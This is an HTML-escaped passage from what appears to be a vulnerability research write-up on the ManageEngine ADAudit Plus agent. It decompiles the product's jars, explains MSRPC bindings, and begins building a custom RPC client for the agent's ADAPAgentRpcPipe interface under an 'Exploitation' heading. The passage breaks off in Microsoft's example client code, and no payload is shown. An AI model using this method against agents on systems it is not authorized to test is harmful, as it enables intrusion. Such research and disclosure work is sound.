&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;157667&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetTableComponents.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user  &lt;span style=&#34;color:#ae81ff&#34;&gt;781984&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetUpdateManagerInstaller.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user   &lt;span style=&#34;color:#ae81ff&#34;&gt;22935&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetWebClientCore.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user   &lt;span style=&#34;color:#ae81ff&#34;&gt;13413&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetWebClientRangeNavigator.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user   &lt;span style=&#34;color:#ae81ff&#34;&gt;13809&lt;/span&gt; Dec  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 08:36 AdventNetWebClientTree.jar
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Jar-files is an acronym for Java Archive. It is a file format based on the
popular ZIP file format and is used for archiving many files into one.&lt;/p&gt;
&lt;p&gt;So yes, it is possible to extract the jar file with a zip tool and retrieve
the content:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/adaudit/7$ 7z l AdventNetADAPClient.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2021-12-30 21:37:22 D....            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  com/adventnet/sym/adsm/common/webclient/tracker
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2021-12-30 21:37:22 D....            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  com/adventnet/sym/adsm/common/webclient/tree
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2021-12-30 21:37:22 D....            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  com/adventnet/sym/adsm/common/webclient/util
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2021-12-30 21:37:22 .....         &lt;span style=&#34;color:#ae81ff&#34;&gt;3836&lt;/span&gt;         &lt;span style=&#34;color:#ae81ff&#34;&gt;1804&lt;/span&gt;  com/adventnet/sym/adsm/auditing/webclient/compliance/ComplianceDEReportHandler.class
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2021-12-30 21:37:22 .....        &lt;span style=&#34;color:#ae81ff&#34;&gt;43842&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;17323&lt;/span&gt;  com/adventnet/sym/adsm/auditing/webclient/compliance/ComplianceReportHandler.class
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2021-12-30 21:37:22 .....         &lt;span style=&#34;color:#ae81ff&#34;&gt;1857&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;764&lt;/span&gt;  com/adventnet/sym/adsm/auditing/webclient/ember/api/ADAPAPIServlet.class
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2021-12-30 21:37:22 .....         &lt;span style=&#34;color:#ae81ff&#34;&gt;1884&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;774&lt;/span&gt;  com/adventnet/sym/adsm/auditing/webclient/ember/api/ADAPAgentAPIServlet.class
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will give you the class files stored in the Jar, however class files
are Java code compiled into Java bytecode which is interpreted by
Java Virtual Machine (JVM) and therefore is not human readable.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/java-decompiler/jd-gui&#34;&gt;jd-gui&lt;/a&gt; is a good tool for
decompiling individual Jar files into a human readable format for analysis
but it does not scale well when you have many files.&lt;/p&gt;
&lt;p&gt;To automate this process, &lt;a href=&#34;https://github.com/intoolswetrust/jd-cli&#34;&gt;jd-cli&lt;/a&gt;
can be used to unzip and decompile the Jar files - making them searchable and
viewable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/adaudit/7$ jd-cli *.jar 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;09:51:11.097 INFO  com.github.kwart.jd.cli.Main - Decompiling AdventNetADAPClient.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;09:51:11.107 INFO  com.github.kwart.jd.output.ZipOutput - ZIP file output will be initialized - AdventNetADAPClient.src.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;09:51:14.930 INFO  com.github.kwart.jd.output.ZipOutput - Finished with &lt;span style=&#34;color:#ae81ff&#34;&gt;129&lt;/span&gt; class file&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; and &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; resource file&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; written.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/adaudit/7$ mkdir src
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/adaudit/7$ cd src
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/adaudit/7/src$ find ../ -name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*src.jar&amp;#39;&lt;/span&gt; -exec unzip -o &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Archive:  ../AdventNetUpdateManagerInstaller.src.jar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inflating: META-INF/MANIFEST.MF    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inflating: com/adventnet/tools/update/installer/images/context_help.png  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inflating: com/adventnet/tools/update/installer/images/context_install.png  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inflating: com/adventnet/tools/update/installer/images/error.png  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inflating: com/adventnet/tools/update/installer/images/help_icon.png  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inflating: com/adventnet/tools/update/installer/images/import.png  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inflating: com/adventnet/tools/update/installer/images/info.png 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From this point, the analysis of the source code could be initiated.&lt;/p&gt;
&lt;h2 id=&#34;discovery&#34;&gt;Discovery&lt;/h2&gt;
&lt;p&gt;What shifted the focus from the initial target was the interest in the functionality
to interact and fetch information from Windows machines with the &lt;code&gt;ADAuditPlusAgent&lt;/code&gt;
installed. The &lt;code&gt;ADAuditPlusAgent&lt;/code&gt; has many features which can be activated
from the ADAudit server, one of these are a so called
&lt;code&gt;SessionMonitoring&lt;/code&gt; feature. This feature starts a process that takes
screenshots at a set interval, and sends them to the central server.
This allows the server to create videos of configuration state changes and
connect them with events. As an example it is possible for the low privileged
user in the agent machine can get a video session of an administrator deleting
a critical configuration file.&lt;/p&gt;
&lt;p&gt;Sounds like a fun feature to review, doesn&amp;rsquo;t it?&lt;/p&gt;
&lt;p&gt;When enabling the &lt;code&gt;SessionMonitoring&lt;/code&gt; feature from the ADAudit server while analysing all
the traffic sent to the agent with wireshark an RPC interaction via named pipes
was discovered.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;wireshark-output-showing-rpc-interaction.png&#34; alt=&#34;wireshark-output-showing-rpc-interaction&#34;&gt;&lt;/p&gt;
&lt;p&gt;Hmm interesting! Lets first dwelve into the history of DCE RPC.&lt;/p&gt;
&lt;h2 id=&#34;dce-rpc--msrpc&#34;&gt;DCE RPC / MSRPC&lt;/h2&gt;
&lt;p&gt;DCE RPC or Distributed Computing Environment Remote Procedure Call is a protocol
used in client to server
interactions and is general term in computer science and not something only
available on Windows Systems.&lt;/p&gt;
&lt;p&gt;Microsoft however wanted their own flavour and developed MSRPC (Microsoft
Remote Procedure Call) with the introduction of Windows NT, first
released in 1993. RPC is an old protocol but it is the foundation of
how inter-computer communication works in Windows environments.&lt;/p&gt;
&lt;p&gt;So basically how RPC works is that a Interface Definition Language (IDL)
is defined that exposes procedures to clients. The IDL also defines
how the client should interact with parameters such as a UUID, version
and optionally a handle.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[
    uuid(7a98c250-6808-11cf-b73b-00aa00b677a7),
    version(1.0),
    implicit_handle(handle_t ImplicitHandle)
]

interface hello
{
    void HelloProc([in, string] unsigned char * pszString);
    void Shutdown(void);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The first part which is called the IDL header. This header should contain a UUID to not
conflict with other RPC interfaces, a version number, and can utilize three different
handles; explicit, implicit and automatic.&lt;/p&gt;
&lt;p&gt;The second part, also known as the IDL body states the procedures that the
client can interact with.&lt;/p&gt;
&lt;p&gt;When connecting to the server a binding to the RPC interface must be initialized. This
can be either &lt;code&gt;ncacn_ip_tcp&lt;/code&gt;, &lt;code&gt;ncalrpc&lt;/code&gt; or &lt;code&gt;ncacn_np&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ncacn_ip_tcp&lt;/strong&gt; uses plain TCP communication to interact with the server. For
this binding to work the RPC server must be configured with a static TCP port
that is reachable. This does not require authentication in order to establish a
connection to the RPC, leaving all authentication responsibility to
the exposed procedure on the server. The initial connection to the RPC is
done over TCP/135.&lt;/p&gt;
&lt;p&gt;Example: &lt;code&gt;ncacn_ip_tcp:100.64.5.212[49670]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ncalrpc&lt;/strong&gt; is used for local RPC interactions which should not be exposed
over the network.&lt;/p&gt;
&lt;p&gt;Example: &lt;code&gt;ncalrpc:[LRPC-dfdb2238aff756a07c]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ncacn_np&lt;/strong&gt; Lets the client and server negotiate TCP port for interaction
and the negotiation occurs over SMB. Meaning this type of binding
requires username and password to connect to SMB, if anonymous sessions
are not enabled.&lt;/p&gt;
&lt;p&gt;Example: &lt;code&gt;ncacn_np:100.64.5.212[\pipe\hello]&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;What we know up to this part is actually only that the ADAudit server is using
RPC to interact with the Agents over a named pipe called &lt;code&gt;ADAPAgentRpcPipe&lt;/code&gt; as
seen in the wirehark screenshot.&lt;/p&gt;
&lt;p&gt;What we now need to do is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create a valid IDL structure&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Brew a large can of coffee&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Build an RPC client&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Guess a lot&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create input data that will be marshalled into a valid stub that servers RPC interface will act on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lets begin with the IDL structure. &lt;a href=&#34;https://www.rpcview.org/&#34;&gt;RpcView&lt;/a&gt; have
everything we need to accomplish this step as the tool can decompile the
IDL structure from the RPC interface. This tool should be executed on the server
exposing the RPC interface:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;using-rpcview-to-decompile-idl-structure-of-rpc-interface.png&#34; alt=&#34;using-rpcview-to-decompile-idl-structure-of-rpc-interface&#34;&gt;&lt;/p&gt;
&lt;p&gt;Get the Visual Studio 2022 installer from &lt;a href=&#34;https://visualstudio.microsoft.com/downloads/&#34;&gt;https://visualstudio.microsoft.com/downloads/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Choose to install &lt;em&gt;Desktop developments with C++&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;installing-visual-studio-c++.png&#34; alt=&#34;installing-visual-studio-c++&#34;&gt;&lt;/p&gt;
&lt;p&gt;Make sure Windows SDK is selected as this packages contains the necessary
components to craft the RPC client:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;installing-windows-sdk.png&#34; alt=&#34;installing-windows-sdk&#34;&gt;&lt;/p&gt;
&lt;p&gt;Fire up a Visual Studio 2022 and initiate a C++ console app project.&lt;/p&gt;
&lt;p&gt;Start by changing the project build options to &lt;code&gt;Release&lt;/code&gt; and &lt;code&gt;x64&lt;/code&gt; in order
to not require debug runtime libraries when running the compiled binary outside
of the build machine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;compiling-c-idl-header-in-visual-studio.png&#34; alt=&#34;compiling-c-idl-header-in-visual-studio&#34;&gt;&lt;/p&gt;
&lt;p&gt;Create a file named &lt;code&gt;ADAPAgentRpcPipe.idl&lt;/code&gt; in the &lt;em&gt;Source Files&lt;/em&gt; structure in Visual Studio:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;create-idl-file-in-visual-studio.png&#34; alt=&#34;create-idl-file-in-visual-studio&#34;&gt;&lt;/p&gt;
&lt;p&gt;Copy the decompiled IDL structure which was exported by RpcView to the newly created file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;uuid&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;a98c250&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6808&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;cf&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;b73b&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;aa00b677a7),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;interface DefaultIfName
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Proc0&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		[in]&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; arg_0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		[in][out]&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; arg_1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Proc1&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		[in]&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; arg_0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		[in][string] &lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; arg_1,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		[in][out]&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; arg_2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Proc2&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		[in][out]&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; arg_0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		[in][out]&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; arg_1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Right click the file in Visual Studio and choose &lt;em&gt;compile&lt;/em&gt; -
Visual Studio will use &lt;code&gt;midl.exe&lt;/code&gt; to compile the IDL file into C code which will handle the
appropriate marshalling operations.&lt;/p&gt;
&lt;p&gt;Marshalling is the process of converting data objects and parameters into a
state that can be transmitted over a network. This is crucial when transporting
complex data structures.&lt;/p&gt;
&lt;p&gt;The data sent to the RPC server when pushing commands to the
ManageEngine ADAudit Agent can actually be viewed
in the DCERPC request in the &lt;code&gt;Stub data&lt;/code&gt; section. An exception to this
visibility is if the server defaults to SMB3, then event the &lt;code&gt;Stub data&lt;/code&gt; section
is encrypted. In the following image the server is using SMB2:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;rpc-stub-data.png&#34; alt=&#34;rpc-stub-data&#34;&gt;&lt;/p&gt;
&lt;p&gt;Back to the project; after compiling of the IDL structure there should now be three new files in
the visual studio project folder:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ADAPAgentRpcPipe_c.c&lt;/code&gt;: _c for client&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ADAPAgentRpcPipe_h.h&lt;/code&gt;: _h for header&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ADAPAgentRpcPipe_s.c&lt;/code&gt;: _s for server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;compiled-idl-structure.png&#34; alt=&#34;compiled-idl-structure&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create a valid IDL structure. Done.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Next up, coffee:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Brew a large can of coffee&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With the IDL structure complete and coffee ready the next step is to build the
RPC client. Microsoft provides &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/rpc/the-client-application&#34;&gt;example code&lt;/a&gt;
specifying how to build an RPC client and server application.
The public code will be used as a skeleton for our ADAuditRPC-client so it is
copied to a file named &lt;code&gt;adauditrpc-client.cpp&lt;/code&gt; under &lt;em&gt;Source Files&lt;/em&gt; in
Visual Studio (use any existing main cpp file or create a new one)&lt;/p&gt;
&lt;p&gt;Example code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* file: helloc.c */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;ctype.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;hello.h&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_STATUS status;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pszUuid             &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pszProtocolSequence &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ncacn_np&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pszNetworkAddress   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
